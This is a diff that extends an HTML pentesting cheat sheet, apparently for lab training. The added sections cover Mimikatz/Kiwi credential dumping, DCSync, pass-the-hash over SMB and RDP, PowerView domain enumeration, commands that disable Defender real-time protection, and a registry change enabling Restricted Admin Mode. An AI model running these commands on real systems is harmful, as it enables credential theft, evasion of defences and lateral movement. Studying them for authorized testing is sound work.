@@ -655,6 +655,7 @@ setg Proxies socks5:127.0.0.1:9050</div>
           <tr><td class="c1">sessions</td><td class="c2">List active sessions</td><td class="c3">sessions</td></tr>
           <tr><td class="c1">sessions -i &lt;ID&gt;</td><td class="c2">Interact with a session</td><td class="c3">sessions -i 1</td></tr>
           <tr><td class="c1">background / bg</td><td class="c2">Push session to background</td><td class="c3">background</td></tr>
+          <tr><td class="c1">sessions -C "&lt;cmd&gt;"</td><td class="c2">Run a command across ALL active sessions at once — e.g. search every session for a process to check who's logged in</td><td class="c3">sessions -C "ps -U bob"</td></tr>
         </table>
       </div>
 
@@ -708,6 +709,39 @@ setg Proxies socks5:127.0.0.1:9050</div>
         <div>When migrating, look for a process running as NTAUTHORITY/SYSTEM to gain the highest level of local privileges and ensure stability.</div>
       </div>
 
+      <div class="cmd-block">
+        <div class="cmd-block-header hdr-red"><span class="icon">🗝️</span>Kiwi (Mimikatz) — credential access</div>
+        <table class="cmd-table">
+          <tr><td class="c1">load kiwi</td><td class="c2">Load the Kiwi extension in an active Meterpreter session (built-in Mimikatz integration)</td><td class="c3">meterpreter &gt; load kiwi</td></tr>
+          <tr><td class="c1">creds_all</td><td class="c2">Dump all available credential types at once (MSV/NTLM, WDigest, Kerberos, SSP)</td><td class="c3">meterpreter &gt; creds_all</td></tr>
+          <tr><td class="c1">creds_msv</td><td class="c2">Dump NTLM hashes specifically</td><td class="c3">meterpreter &gt; creds_msv</td></tr>
+          <tr><td class="c1">lsa_dump_sam</td><td class="c2">Dump local SAM database hashes</td><td class="c3">meterpreter &gt; lsa_dump_sam</td></tr>
+          <tr><td class="c1">lsa_dump_secrets</td><td class="c2">Dump LSA secrets (service account creds, cached data)</td><td class="c3">meterpreter &gt; lsa_dump_secrets</td></tr>
+          <tr><td class="c1">dcsync_ntlm &lt;user&gt;</td><td class="c2">Pull a domain user's NTLM hash via DCSync (needs replication rights, e.g. from a DC)</td><td class="c3">meterpreter &gt; dcsync_ntlm CORP\bob</td></tr>
+        </table>
+        <div style="padding: 0 12px 12px;">
+          <div class="callout callout-tip" style="margin-bottom:0;">
+            <span class="callout-icon">💡</span>
+            <div>Needs an elevated (admin/SYSTEM) session to work reliably — if <code>load kiwi</code> or the creds commands fail, escalate privileges first (see Phase 4) or <code>migrate</code> into a SYSTEM process.</div>
+          </div>
+        </div>
+      </div>
+
+      <div class="cmd-block">
+        <div class="cmd-block-header hdr-red"><span class="icon">🎫</span>Pass-the-Hash (PtH)</div>
+        <table class="cmd-table">
+          <tr><td class="c1">SMBPass format</td><td class="c2">Modules like psexec expect LM:NTLM — if you only have the NTLM hash, use it for both halves</td><td class="c3">set SMBPass &lt;NTHASH&gt;:&lt;NTHASH&gt;</td></tr>
+          <tr><td class="c1">exploit/windows/smb/psexec</td><td class="c2">Classic PtH module — auth with a hash instead of a cleartext password</td><td class="c3">set SMBUser bob<br>set SMBPass &lt;NTHASH&gt;:&lt;NTHASH&gt;<br>set RHOSTS 192.168.1.50</td></tr>
+          <tr><td class="c1">xfreerdp3 /pth</td><td class="c2">Pass-the-hash over RDP instead of SMB (needs Restricted Admin Mode enabled on target — see Windows Quick Ref)</td><td class="c3">xfreerdp3 /v:192.168.1.50 /u:bob /pth:&lt;NTHASH&gt;</td></tr>
+        </table>
+        <div style="padding: 0 12px 12px;">
+          <div class="callout callout-info" style="margin-bottom:0;">
+            <span class="callout-icon">ℹ</span>
+            <div>You never need to crack the hash to use it this way — that's the point of PtH. The hash <em>is</em> the credential as far as NTLM authentication is concerned.</div>
+          </div>
+        </div>
+      </div>
+
       <div class="divider"></div>
 
       <div class="flag-block">
@@ -718,6 +752,7 @@ setg Proxies socks5:127.0.0.1:9050</div>
             <tr><td class="flg">/v:&lt;host&gt;[:port]</td><td class="fd">Target to connect to (default port 3389)</td></tr>
             <tr><td class="flg">/u:&lt;user&gt;</td><td class="fd">Username</td></tr>
             <tr><td class="flg">/p:&lt;pass&gt;</td><td class="fd">Password</td></tr>
+            <tr><td class="flg">/pth:&lt;NTHASH&gt;</td><td class="fd">Pass-the-hash — authenticate with an NTLM hash instead of /p</td></tr>
             <tr><td class="flg">/d:&lt;domain&gt;</td><td class="fd">Domain to authenticate against</td></tr>
             <tr><td class="flg">/cert:ignore</td><td class="fd">Ignore certificate warnings (common in labs)</td></tr>
             <tr><td class="flg">/sec:nla|tls|rdp</td><td class="fd">Force a specific security protocol</td></tr>
@@ -1076,6 +1111,7 @@ setg Proxies socks5:127.0.0.1:9050</div>
       <a class="nav-pill" href="#win-net">Networking</a>
       <a class="nav-pill" href="#win-users">Users/AD</a>
       <a class="nav-pill" href="#win-logging">Logging</a>
+      <a class="nav-pill" href="#win-defense">Defender &amp; RDP (PtH)</a>
       <a class="nav-pill" href="#win-recon">Offensive Recon Cmds</a>
     </div>
 
@@ -1186,7 +1222,38 @@ setg Proxies socks5:127.0.0.1:9050</div>
           <tr><td class="c1">netstat -ano</td><td class="c2">Active connections + PID</td><td class="c3">netstat -ano</td></tr>
           <tr><td class="c1">nslookup</td><td class="c2">DNS lookup</td><td class="c3">nslookup example.com</td></tr>
           <tr><td class="c1">Test-NetConnection</td><td class="c2">PS: port/connectivity test</td><td class="c3">tnc host -Port 445</td></tr>
+          <tr><td class="c1">net share</td><td class="c2">List shares hosted by the local machine</td><td class="c3">net share</td></tr>
         </table>
+      </div>
+
+      <div class="ref-wrap">
+        <div class="ref-wrap-title">AD / network enumeration from the command line</div>
+        <table class="ref-table">
+          <thead><tr><th>Command</th><th>What it does</th></tr></thead>
+          <tbody>
+            <tr><td class="fp">Get-DomainComputer</td><td class="fd">List computer objects in the domain (PowerView-style cmdlet)</td></tr>
+            <tr><td class="fp">Get-IPAddress</td><td class="fd">Resolve a hostname to its IP address</td></tr>
+            <tr><td class="fp">Get-DomainUser</td><td class="fd">List domain user objects</td></tr>
+            <tr><td class="fp">Get-DomainGroup</td><td class="fd">List domain groups</td></tr>
+            <tr><td class="fp">Get-DomainGroupMember</td><td class="fd">List members of a specific group</td></tr>
+            <tr><td class="fp">Get-DomainOU</td><td class="fd">List Organizational Units</td></tr>
+          </tbody>
+        </table>
+        <div style="padding: 8px 14px 4px;">
+          <div class="callout callout-info" style="margin-bottom:8px;">
+            <span class="callout-icon">ℹ</span>
+            <div>These are PowerView-family cmdlets, not built into Windows by default — load the module first (see PowerView on the Offensive Cyber tab). Exact cmdlet names/casing can vary slightly by module version, so tab-complete or <code>Get-Command *domain*</code> to confirm what's actually loaded.</div>
+          </div>
+        </div>
+        <div style="padding: 0 14px 14px;">
+          <div class="step-text" style="margin-bottom:5px; font-weight:500;">Chaining commands together — resolve every domain computer's IP in one line:</div>
+          <div class="step-cmd">Get-DomainComputer -Domain &lt;domain&gt; | select name | Get-IPAddress</div>
+          <div class="step-text" style="margin:10px 0 5px; font-weight:500;">Group domain users by which group they belong to:</div>
+          <div class="step-cmd">Get-DomainGroup | select name | % { Get-DomainGroupMember -Identity $_.name }</div>
+          <div class="step-text" style="margin:10px 0 5px; font-weight:500;">Connecting to a discovered share once you have a target host:</div>
+          <div class="step-cmd">net use \\&lt;target&gt;\&lt;share&gt; /user:&lt;domain&gt;\&lt;user&gt; &lt;pass&gt;
+dir \\&lt;target&gt;\&lt;share&gt;</div>
+        </div>
       </div>
     </div>
 
@@ -1200,6 +1267,7 @@ setg Proxies socks5:127.0.0.1:9050</div>
           <tr><td class="c1">whoami /groups</td><td class="c2">Show current user's groups</td><td class="c3">whoami /groups</td></tr>
           <tr><td class="c1">net group /domain</td><td class="c2">Query domain group</td><td class="c3">net group "Domain Admins" /domain</td></tr>
           <tr><td class="c1">Get-ADUser</td><td class="c2">PS/AD module: query user</td><td class="c3">Get-ADUser -Filter *</td></tr>
+          <tr><td class="c1">net localgroup administrators</td><td class="c2">List members of local admins group</td><td class="c3">net localgroup administrators</td></tr>
         </table>
       </div>
     </div>
@@ -1214,6 +1282,38 @@ setg Proxies socks5:127.0.0.1:9050</div>
           <tr><td class="c1">Event ID 4624</td><td class="c2">Successful logon</td><td class="c3">Security log</td></tr>
           <tr><td class="c1">Event ID 4625</td><td class="c2">Failed logon</td><td class="c3">Security log</td></tr>
         </table>
+      </div>
+    </div>
+
+    <div class="section" id="win-defense">
+      <div class="section-label"><span class="dot dot-orange"></span>Defender &amp; RDP for Pass-the-Hash</div>
+      <div class="grid-2">
+        <div class="cmd-block">
+          <div class="cmd-block-header"><span class="icon">🛡️</span>Windows Defender status</div>
+          <table class="cmd-table">
+            <tr><td class="c1">Get-MpPreference</td><td class="c2">Show current Defender config</td><td class="c3">Get-MpPreference</td></tr>
+            <tr><td class="c1">... | select DisableRealTimeMonitoring</td><td class="c2">Check specifically whether real-time protection is on</td><td class="c3">Get-MpPreference | select DisableRealTimeMonitoring</td></tr>
+            <tr><td class="c1">Set-MpPreference</td><td class="c2">Change a Defender setting (needs admin)</td><td class="c3">Set-MpPreference -DisableRealTimeMonitoring $true</td></tr>
+          </table>
+          <div style="padding: 0 12px 12px;">
+            <div class="callout callout-warn" style="margin-bottom:0;">
+              <span class="callout-icon">⚠</span>
+              <div>The cmdlet is <code>Set-MpPreference</code>, not <code>Set DisableRealTimeMonitoring</code> directly — the setting name is passed as a parameter to Set-MpPreference. Lab-only: disabling real-time protection outside an authorized lab is not something to do on a real system.</div>
+            </div>
+          </div>
+        </div>
+        <div class="cmd-block">
+          <div class="cmd-block-header"><span class="icon">🖥️</span>Enable Restricted Admin Mode (for RDP PtH)</div>
+          <table class="cmd-table">
+            <tr><td class="c1">reg add ... DisableRestrictedAdmin</td><td class="c2">Set to 0 to allow Restricted Admin Mode, which lets you RDP using a hash instead of a cleartext password</td><td class="c3">reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f</td></tr>
+          </table>
+          <div style="padding: 0 12px 12px;">
+            <div class="callout callout-info" style="margin-bottom:0;">
+              <span class="callout-icon">ℹ</span>
+              <div>Yes, the naming is a double-negative: setting <code>DisableRestrictedAdmin</code> to <strong>0</strong> ENABLES Restricted Admin Mode. Once it's on, connect with <code>xfreerdp3 .../pth:&lt;NTHASH&gt;</code> (see the Pass-the-Hash section on the Offensive Cyber tab) instead of a plaintext password.</div>
+            </div>
+          </div>
+        </div>
       </div>
     </div>
 
